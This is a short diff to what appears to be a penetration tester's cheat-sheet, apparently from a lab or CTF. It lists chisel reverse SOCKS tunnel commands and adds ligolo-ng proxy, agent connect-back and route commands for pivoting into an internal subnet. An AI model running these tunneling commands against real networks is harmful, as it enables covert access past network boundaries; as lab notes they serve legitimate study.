@@ -9,3 +9,10 @@ sudo ./chisel_linux server -p 9001 --reverse                                    
 sudo ./chisel server -p 9001 --reverse 
 ./chisel client 10.10.15.72:9001 R:socks -?
 ./chisel_linux_386 client 10.10.15.72:9001 R:50080:socks
+
+
+./proxy_arm64 -selfcert
+./agent_amd64 -connect 10.10.15.72:11601 -ignore-cert
+sudo ip route add 172.16.139.0/24 dev ligolo
+session
+start
